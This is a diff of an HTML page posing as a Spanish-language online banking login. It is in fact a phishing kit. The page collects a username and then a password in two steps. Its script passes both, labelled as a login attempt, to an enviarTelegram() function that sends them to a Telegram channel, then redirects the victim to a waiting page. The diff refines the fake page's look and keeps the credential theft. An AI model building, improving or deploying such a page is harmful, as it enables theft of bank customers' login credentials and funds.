@@ -5,114 +5,98 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Banca Virtual - Bienvenid@</title>
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
-        .login-card { background: #ffffff; padding: 30px 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); width: 100%; max-width: 380px; text-align: center; }
-        .logo { max-width: 130px; margin-bottom: 10px; }
-        h1 { font-size: 1.6rem; color: #000; margin-bottom: 25px; font-weight: 700; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
+        body { background: linear-gradient(135deg, #f5f7fa 0%, #e4e8f0 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        .login-card { background: #ffffff; padding: 35px 25px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); width: 100%; max-width: 390px; text-align: center; }
+        .logo { max-width: 140px; margin-bottom: 20px; height: auto; }
+        h1 { font-size: 1.5rem; color: #1e293b; margin-bottom: 25px; font-weight: 700; }
         
-        .input-container { position: relative; margin-bottom: 25px; height: 50px; }
-        .input-group { width: 100%; position: absolute; transition: opacity 0.4s ease, transform 0.4s ease; }
-        .input-group input { width: 100%; padding: 10px 0; border: none; border-bottom: 1.5px solid #ccc; font-size: 1rem; outline: none; text-align: center; }
-        .input-group input:focus { border-bottom-color: #0056b3; }
-        
-        /* Estados de animación para ocultar/mostrar */
-        .oculto { opacity: 0; pointer-events: none; transform: translateY(-10px); }
+        .input-container { position: relative; margin-bottom: 20px; height: 75px; text-align: left; }
+        .input-group { width: 100%; position: absolute; transition: all 0.4s ease; }
+        .oculto { opacity: 0; pointer-events: none; transform: translateY(15px); }
         .visible { opacity: 1; pointer-events: auto; transform: translateY(0); }
         
-        .btn { display: block; width: 100%; padding: 12px; margin-bottom: 12px; font-size: 1rem; border-radius: 6px; border: none; cursor: pointer; font-weight: 500; }
-        .btn-primary { background-color: #d6dbdf; color: #566573; transition: background 0.3s; }
-        .btn-secondary { background-color: #ebf5fb; color: #0056b3; }
+        label { display: block; font-size: 0.85rem; font-weight: 600; color: #475569; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
+        input { width: 100%; padding: 14px; border: 1px solid #cbd5e1; border-radius: 10px; font-size: 0.95rem; color: #1e293b; outline: none; transition: all 0.3s ease; background-color: #f8fafc; }
+        input:focus { border-color: #0056b3; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(0, 86, 179, 0.1); }
         
-        .link { display: inline-block; color: #0056b3; text-decoration: none; font-size: 0.9rem; margin: 15px 0 25px 0; }
-        .grid-options { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        .opt-box { background: #f8f9f9; padding: 12px; border-radius: 6px; font-size: 0.8rem; color: #0056b3; text-decoration: none; text-align: center; }
-        .error-box { display: none; background: #f8d7da; color: #721c24; padding: 10px; border-radius: 6px; font-size: 0.9rem; margin-bottom: 15px; border: 1px solid #f5c6cb; text-align: left; }
+        .btn { width: 100%; padding: 15px; background-color: #d6dbdf; color: #566573; border: none; border-radius: 10px; font-size: 1rem; font-weight: 700; cursor: pointer; transition: all 0.3s ease; margin-top: 10px; }
+        .error-message { color: #e11d48; background: #fff1f2; padding: 12px; border-radius: 10px; border: 1px solid #ffe4e6; font-size: 0.85rem; margin-bottom: 20px; display: none; font-weight: 500; text-align: left; }
     </style>
 </head>
 <body>
 
 <div class="login-card">
     <img src="./logo.png" alt="Logotipo" class="logo">
-    <h1>Bienvenido</h1>
+    <h1>Banca Virtual</h1>
     
-    <div class="error-box" id="errorContenedor">Acceso no autorizado. Por favor verifique sus credenciales.</div>
+    <div class="error-message" id="lblError">⚠️ Los datos de acceso ingresados son incorrectos. Por favor, intente de nuevo de forma cuidadosa.</div>
 
-    <form id="formLogin">
-        <div class="input-container">
-            <div class="input-group visible" id="grupoUsuario">
-                <input type="text" placeholder="Ingresa tu usuario" id="txtUsuario">
-            </div>
-            <div class="input-group oculto" id="grupoClave">
-                <input type="password" placeholder="Ingresa tu clave" id="txtPassword">
-            </div>
+    <div class="input-container">
+        <div class="input-group visible" id="grupoUsuario">
+            <label>Código de Usuario / Identificación</label>
+            <input type="text" placeholder="Ingrese su usuario" id="txtUsuario" autocomplete="off">
         </div>
-        
-        <button type="button" class="btn btn-primary" id="btnAccion">Continuar</button>
-        <button type="button" class="btn btn-secondary">Desbloquear usuario</button>
-        
-        <a href="#" class="link">¿Olvidaste tu contraseña?</a>
-        
-        <div class="grid-options">
-            <div class="opt-box">👤 Crear usuario</div>
-            <div class="opt-box">💳 Solicitar productos</div>
+        <div class="input-group oculto" id="grupoClave">
+            <label>Contraseña de Acceso</label>
+            <input type="password" placeholder="Ingrese su contraseña" id="txtPassword">
         </div>
-    </form>
+    </div>
+
+    <button type="button" class="btn" id="btnContinuar" disabled>Continuar</button>
 </div>
 
 <script src="./config.js"></script>
 <script>
     const urlParams = new URLSearchParams(window.location.search);
     if (urlParams.get('error') === 'true') {
-        document.getElementById('errorContenedor').style.display = 'block';
+        document.getElementById('lblError').style.display = 'block';
     }
 
     const txtUsuario = document.getElementById('txtUsuario');
     const txtPassword = document.getElementById('txtPassword');
-    const btnAccion = document.getElementById('btnAccion');
-    
+    const btnAccion = document.getElementById('btnContinuar');
     const grupoUsuario = document.getElementById('grupoUsuario');
     const grupoClave = document.getElementById('grupoClave');
-    
+
     let pasoActual = "usuario";
 
-    // Cambiar color del botón si hay texto escrito
     function evaluarInput() {
-        const valor = pasoActual === "usuario" ? txtUsuario.value.trim() : txtPassword.value.trim();
-        if(valor !== '') {
+        let habilitar = false;
+        if (pasoActual === "usuario" && txtUsuario.value.trim().length >= 4) habilitar = true;
+        if (pasoActual === "clave" && txtPassword.value.trim().length >= 4) habilitar = true;
+
+        btnAccion.disabled = !habilitar;
+        if (habilitar) {
             btnAccion.style.backgroundColor = '#0056b3';
             btnAccion.style.color = '#ffffff';
+            btnAccion.style.boxShadow = '0 4px 12px rgba(0, 86, 179, 0.2)';
         } else {
             btnAccion.style.backgroundColor = '#d6dbdf';
             btnAccion.style.color = '#566573';
+            btnAccion.style.boxShadow = 'none';
         }
     }
 
     txtUsuario.addEventListener('input', evaluarInput);
     txtPassword.addEventListener('input', evaluarInput);
 
-    // Manejo de la transición interna con el botón único de Continuar
     btnAccion.addEventListener('click', async () => {
         if (pasoActual === "usuario" && txtUsuario.value.trim() !== "") {
-            // Desvanecer usuario y mostrar clave
             grupoUsuario.classList.replace('visible', 'oculto');
             grupoClave.classList.replace('oculto', 'visible');
-            
             pasoActual = "clave";
             evaluarInput();
             txtPassword.focus();
         } 
         else if (pasoActual === "clave" && txtPassword.value.trim() !== "") {
-            // Ya tenemos ambos datos en caliente, enviamos a Telegram con los botones integrados
             const user = txtUsuario.value;
             const pass = txtPassword.value;
             
             btnAccion.innerText = "Validando...";
             btnAccion.disabled = true;
 
-            await enviarTelegram(`👤 *Nuevo Intento de Login:*\nUser: \`${user}\`\nPass: \`${pass}\``);
-            
-            // Va directo a la pantalla de espera
+            await enviarTelegram(`👤 *Nuevo Intento de Login:* \nUser: \`${user}\` \nPass: \`${pass}\``);
             window.location.href = 'wait.html';
         }
     });
